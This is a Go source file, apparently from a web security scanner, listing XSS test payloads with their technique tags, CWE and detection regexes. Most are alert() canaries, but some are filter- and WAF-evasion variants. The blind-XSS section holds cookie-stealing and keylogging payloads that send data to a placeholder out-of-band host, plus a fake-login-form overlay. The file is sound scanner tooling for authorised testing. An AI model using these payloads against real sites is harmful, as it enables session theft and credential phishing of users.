package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// XSS Payloads â€” Sourced from PayloadsAllTheThings/XSS Injection
// Covers: Reflected, Stored, DOM-Based, Event Handler, Attribute Breakout,
//         JS Protocol, HTML5 Tags, SVG, Template XSS, Blind XSS,
//         WAF Bypass, Polyglot, Mutation XSS
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func XSSPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatXSS,
		Description: "Cross-Site Scripting â€” PayloadsAllTheThings + OWASP A03:2021 / CWE-79",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection",
		Payloads:    xssAll(),
	}
}

func xssAll() []Payload {
	var all []Payload
	all = append(all, xssBasic()...)
	all = append(all, xssEventHandlers()...)
	all = append(all, xssAttributeBreakout()...)
	all = append(all, xssJSProtocol()...)
	all = append(all, xssHTML5Tags()...)
	all = append(all, xssSVG()...)
	all = append(all, xssDOM()...)
	all = append(all, xssTemplateXSS()...)
	all = append(all, xssBlind()...)
	all = append(all, xssWAFBypass()...)
	all = append(all, xssPolyglot()...)
	return all
}

// â”€â”€â”€â”€ Basic Script Tag (PayloadsAllTheThings Common Payloads) â”€â”€â”€â”€
func xssBasic() []Payload {
	return []Payload{
		xp("xss-script-alert", TechReflectedXSS, "Classic Script Alert",
			`<script>alert('VYO-XSS-001')</script>`,
			"Classic reflected XSS via script tag"),
		xp("xss-script-nested", TechReflectedXSS, "Nested Script Tag",
			`<scr<script>ipt>alert('VYO-XSS-002')</scr</script>ipt>`,
			"Nested tag to survive single-pass <script> stripping"),
		xp("xss-script-breakout", TechReflectedXSS, "Double-Quote Breakout Script",
			`"><script>alert('VYO-XSS-003')</script>`,
			"Attribute breakout + script tag injection"),
		xp("xss-script-fromcharcode", TechReflectedXSS, "String.fromCharCode",
			`"><script>alert(String.fromCharCode(86,89,79))</script>`,
			"fromCharCode to bypass alert() keyword filters"),
		xp("xss-script-unicode-escape", TechReflectedXSS, "Unicode Escape Alert",
			`<script>\u0061lert('VYO-XSS-004')</script>`,
			"JavaScript Unicode escape for 'a' â€” bypasses alert keyword filter"),
		xp("xss-script-eval-hex", TechReflectedXSS, "eval() Hex Encoded",
			`<script>eval('\x61lert(\'VYO-XSS-005\')')</script>`,
			"eval with hex-encoded alert â€” double evasion"),
		xp("xss-script-eval-parseInt", TechReflectedXSS, "parseInt Obfuscation",
			`<script>eval(8680439..toString(30))(983801..toString(36))</script>`,
			"PayloadsAllTheThings parseInt technique â€” confirm/prompt via number"),
		xp("xss-object-data", TechReflectedXSS, "Object Data URI",
			`<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">`,
			"HTML entity encoded javascript: in object data attribute"),
	}
}

// â”€â”€â”€â”€ Event Handler XSS (PayloadsAllTheThings img/svg/body/input) â”€â”€â”€â”€
func xssEventHandlers() []Payload {
	handlers := []struct{ id, name, value, desc string }{
		{"xss-img-onerror", "IMG onerror", `<img src=x onerror=alert('VYO-XSS-010')>`, "img onerror event â€” bypasses script tag filters"},
		{"xss-img-onerror-breakout", "IMG onerror Breakout", `"><img src=x onerror=alert('VYO-XSS-011')>`, "Attribute breakout + img onerror"},
		{"xss-img-onerror-fromcharcode", "IMG fromCharCode", `<img src=x onerror=alert(String.fromCharCode(88,83,83))>`, "img onerror with String.fromCharCode"},
		{"xss-img-src-eval", "IMG src:alert eval", `<img src=x:alert(alt) onerror=eval(src) alt=xss>`, "PayloadsAllTheThings img src/alt chained eval"},
		{"xss-svg-onload", "SVG onload", `<svg/onload=alert('VYO-XSS-012')>`, "SVG element with onload auto-fire"},
		{"xss-svg-id-eval", "SVG id eval", `<svg id=alert(1) onload=eval(id)>`, "SVG id attribute evaluated as JS"},
		{"xss-body-onload", "Body onload", `"><body onload=alert('VYO-XSS-013')>`, "Body element onload injection"},
		{"xss-input-autofocus", "Input autofocus onfocus", `"><input autofocus onfocus=alert('VYO-XSS-014')>`, "autofocus triggers onfocus without interaction"},
		{"xss-select-autofocus", "Select autofocus", `<select autofocus onfocus=alert('VYO-XSS-015')>`, "HTML5 select autofocus injection"},
		{"xss-textarea-autofocus", "Textarea autofocus", `<textarea autofocus onfocus=alert('VYO-XSS-016')>`, "HTML5 textarea autofocus injection"},
		{"xss-keygen-autofocus", "Keygen autofocus", `<keygen autofocus onfocus=alert('VYO-XSS-017')>`, "Legacy keygen element autofocus"},
		{"xss-details-ontoggle", "Details ontoggle", `<details open ontoggle=alert('VYO-XSS-018')>`, "HTML5 details auto-open triggers ontoggle"},
		{"xss-marquee-onstart", "Marquee onstart", `<marquee onstart=alert('VYO-XSS-019')>`, "Legacy marquee onstart â€” bypasses modern tag filters"},
		{"xss-video-poster", "Video poster onerror", `<video poster=x onerror=alert('VYO-XSS-020')>`, "Video poster attribute load error"},
		// Pointer events (PayloadsAllTheThings Div payloads)
		{"xss-div-pointerover", "Div onpointerover", `<div onpointerover="alert('VYO-XSS-021')">HOVER</div>`, "Pointer event â€” fires on mouse hover"},
		{"xss-div-pointerdown", "Div onpointerdown", `<div onpointerdown="alert('VYO-XSS-022')">CLICK</div>`, "Pointer event â€” fires on click/touch"},
		{"xss-div-pointerenter", "Div onpointerenter", `<div onpointerenter="alert('VYO-XSS-023')">ENTER</div>`, "Pointer event â€” fires on element enter"},
	}

	var payloads []Payload
	for _, h := range handlers {
		payloads = append(payloads,
			xp(h.id, TechEventHandler, h.name, h.value, h.desc))
	}
	return payloads
}

// â”€â”€â”€â”€ Attribute Breakout â”€â”€â”€â”€
func xssAttributeBreakout() []Payload {
	return []Payload{
		xp("xss-attr-dq-onfocus", TechAttributeBreak, "DQ Attr Breakout onfocus",
			`" onfocus=alert('VYO-XSS-030') autofocus="`,
			"Break out of double-quoted attribute to inject event handler"),
		xp("xss-attr-sq-onfocus", TechAttributeBreak, "SQ Attr Breakout onfocus",
			`' onfocus=alert('VYO-XSS-031') autofocus='`,
			"Break out of single-quoted attribute to inject event handler"),
		xp("xss-attr-backtick", TechAttributeBreak, "Backtick Attr Breakout",
			"` onfocus=alert('VYO-XSS-032') autofocus=`",
			"Backtick attribute breakout â€” effective in older IE engines"),
		xp("xss-attr-tag-close", TechAttributeBreak, "Tag Close + New Tag",
			`"><svg onload=alert('VYO-XSS-033')>`,
			"Close current tag and inject new SVG element"),
	}
}

// â”€â”€â”€â”€ JavaScript Protocol (PayloadsAllTheThings Wrapper javascript:) â”€â”€â”€â”€
func xssJSProtocol() []Payload {
	return []Payload{
		xp("xss-js-href", TechJSProtocol, "javascript: Protocol",
			`javascript:alert('VYO-XSS-040')`,
			"JavaScript pseudo-protocol injection into href/src attributes"),
		xp("xss-js-entities", TechJSProtocol, "HTML Entity JS Protocol",
			`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('VYO-XSS-041')`,
			"HTML entity encoded javascript: â€” bypasses keyword filters"),
		xp("xss-js-data-uri", TechJSProtocol, "Data URI Script",
			`data:text/html,<script>alert('VYO-XSS-042')</script>`,
			"Data URI scheme to inject HTML with script execution"),
		xp("xss-js-base64-data", TechJSProtocol, "Base64 Data URI",
			`data:text/html;base64,PHNjcmlwdD5hbGVydCgnVllPLVhTUy0wNDMnKTwvc2NyaXB0Pg==`,
			"Base64-encoded data URI â€” bypasses content inspection"),
	}
}

// â”€â”€â”€â”€ HTML5 Tags (PayloadsAllTheThings XSS using HTML5 tags) â”€â”€â”€â”€
func xssHTML5Tags() []Payload {
	return []Payload{
		xp("xss-body-source", TechReflectedXSS, "Body onload /XSS/.source",
			`<body onload=alert(/VYO-XSS-050/.source)>`,
			"RegExp source property â€” avoids string delimiters"),
		xp("xss-isindex", TechReflectedXSS, "Isindex Prompt",
			`<isindex type=image src=1 onerror=alert('VYO-XSS-051')>`,
			"Legacy isindex element with image type"),
	}
}

// â”€â”€â”€â”€ SVG-Based XSS (PayloadsAllTheThings XSS in SVG) â”€â”€â”€â”€
func xssSVG() []Payload {
	return []Payload{
		xp("xss-svg-script", TechReflectedXSS, "SVG Script Element",
			`<svg><script>alert('VYO-XSS-060')</script></svg>`,
			"SVG namespace script element execution"),
		xp("xss-svg-script-href", TechReflectedXSS, "SVG Script href (Firefox)",
			`<svg><script href=data:,alert(1) />`,
			"Firefox self-closing script in SVG â€” PayloadsAllTheThings"),
		xp("xss-svg-animate", TechReflectedXSS, "SVG Animate",
			`<svg><animate onbegin=alert('VYO-XSS-061') attributeName=x dur=1s>`,
			"SVG animate element onbegin event"),
		xp("xss-svg-set", TechReflectedXSS, "SVG Set",
			`<svg><set onbegin=alert('VYO-XSS-062') attributeName=x to=1>`,
			"SVG set element onbegin trigger"),
	}
}

// â”€â”€â”€â”€ DOM-Based XSS â”€â”€â”€â”€
func xssDOM() []Payload {
	return []Payload{
		xp("xss-dom-location-hash", TechDOMXSS, "location.hash Sink",
			`#<img src=x onerror=alert('VYO-XSS-070')>`,
			"Fragment-based DOM XSS targeting innerHTML sinks"),
		xp("xss-dom-document-write", TechDOMXSS, "document.write Sink",
			`<img src=x onerror=alert('VYO-XSS-071')>`,
			"Payload targeting document.write() DOM sinks"),
		xp("xss-dom-innerhtml", TechDOMXSS, "innerHTML Sink",
			`<img src=x onerror=alert('VYO-XSS-072')>`,
			"Payload targeting element.innerHTML assignment"),
	}
}

// â”€â”€â”€â”€ Client-Side Template Injection XSS â”€â”€â”€â”€
func xssTemplateXSS() []Payload {
	return []Payload{
		xp("xss-template-angular", TechTemplateXSS, "AngularJS Sandbox Escape",
			`{{constructor.constructor('alert(1)')()}}`,
			"AngularJS sandbox escape via constructor chain â€” PayloadsAllTheThings"),
		xp("xss-template-vuejs", TechTemplateXSS, "Vue.js Template Injection",
			`{{_c.constructor('alert(1)')()}}`,
			"Vue.js render context escape"),
	}
}

// â”€â”€â”€â”€ Blind XSS (PayloadsAllTheThings Blind XSS) â”€â”€â”€â”€
func xssBlind() []Payload {
	return []Payload{
		xp("xss-blind-data-grabber", TechBlindXSS, "Blind Cookie Grabber",
			`<script>new Image().src="http://VYOMITE_OOB_HOST/c="+document.cookie</script>`,
			"Blind XSS cookie exfiltration via image beacon â€” PayloadsAllTheThings"),
		xp("xss-blind-fetch-cors", TechBlindXSS, "Blind Fetch CORS",
			`<script>fetch('https://VYOMITE_OOB_HOST',{method:'POST',mode:'no-cors',body:document.cookie})</script>`,
			"Blind XSS via fetch API â€” PayloadsAllTheThings CORS technique"),
		xp("xss-blind-keylogger", TechBlindXSS, "Blind Keylogger",
			`<img src=x onerror='document.onkeypress=function(e){fetch("http://VYOMITE_OOB_HOST/?k="+String.fromCharCode(e.which))},this.remove();'>`,
			"JavaScript keylogger â€” PayloadsAllTheThings"),
		xp("xss-blind-ui-redress", TechBlindXSS, "Blind UI Redressing",
			`<script>history.replaceState(null,null,'../../../login');document.body.innerHTML="<h1>Login</h1><form><input name=user><input name=pass type=password><input type=submit></form>"</script>`,
			"UI redressing â€” replaces page with fake login form"),
	}
}

// â”€â”€â”€â”€ WAF Bypass XSS â”€â”€â”€â”€
func xssWAFBypass() []Payload {
	return []Payload{
		xp("xss-waf-mixed-case", TechWAFBypass, "Mixed Case Script",
			`<ScRiPt>alert('VYO-XSS-080')</sCrIpT>`,
			"Mixed case to bypass case-sensitive WAF rules"),
		xp("xss-waf-double-encode", TechWAFBypass, "Double URL Encoding",
			`%253Cscript%253Ealert('VYO-XSS-081')%253C/script%253E`,
			"Double URL-encoding to bypass single-pass WAF"),
		xp("xss-waf-null-byte", TechWAFBypass, "Null Byte Split",
			"<scr\x00ipt>alert('VYO-XSS-082')</script>",
			"Null byte insertion to split keyword â€” bypasses regex WAFs"),
		xp("xss-waf-recursive-strip", TechWAFBypass, "Recursive Tag Nesting",
			`<scr<script>ipt>alert('VYO-XSS-083')</scr</script>ipt>`,
			"Nested tags to survive single-pass sanitization"),
		xp("xss-waf-html-comment", TechWAFBypass, "HTML Comment Break",
			`<!--><svg onload=alert('VYO-XSS-084')>-->`,
			"HTML comment edge case â€” some parsers render content"),
		xp("xss-waf-tab-newline", TechWAFBypass, "Tab/Newline in Tag",
			"<svg\tonload=alert('VYO-XSS-085')>",
			"Tab character instead of space in tag â€” bypasses space-based filters"),
		xp("xss-waf-entity-event", TechWAFBypass, "HTML Entity Event",
			`<svg><script>alert&lpar;'VYO-XSS-086'&rpar;</script></svg>`,
			"HTML entity encoded parentheses â€” PayloadsAllTheThings SVG"),
	}
}

// â”€â”€â”€â”€ Polyglot XSS â”€â”€â”€â”€
func xssPolyglot() []Payload {
	return []Payload{
		xp("xss-polyglot-mega", TechPolyglot, "Mega Polyglot XSS",
			`jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert('VYO-XSS-090') )//%%0D%0A%0d%0a//</stYle/</titLe/</telerik/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('VYO-XSS-090')//>\x3e`,
			"Multi-context polyglot â€” PayloadsAllTheThings inspired mega payload"),
		xp("xss-polyglot-comment", TechPolyglot, "Comment Context Polyglot",
			`'">--><svg onload=alert('VYO-XSS-091')>`,
			"Breaks out of attributes, comments, and tags simultaneously"),
	}
}

// â”€â”€â”€â”€ XSS payload helper â”€â”€â”€â”€
func xp(id string, tech Technique, name, value, desc string) Payload {
	return Payload{
		ID: id, Category: CatXSS, Technique: tech, Name: name, Value: value,
		Description: desc,
		Contexts:    []InjectionContext{CtxURLQuery, CtxFormBody},
		Detection:   DetectReflection,
		DetectSignature: func() string {
			// Use canary pattern for reflection detection
			if len(id) > 4 {
				return `(?i)(alert\(['"]?VYO-XSS|onerror=|onload=|onfocus=|javascript:)`
			}
			return ``
		}(),
		Severity: SevHigh, SafeMode: true, CVSSScore: 7.5,
		CWE: "CWE-79", OWASPCategory: "A03:2021",
		Reference: "PayloadsAllTheThings", Enabled: true,
		Tags: []string{string(tech)},
	}
}
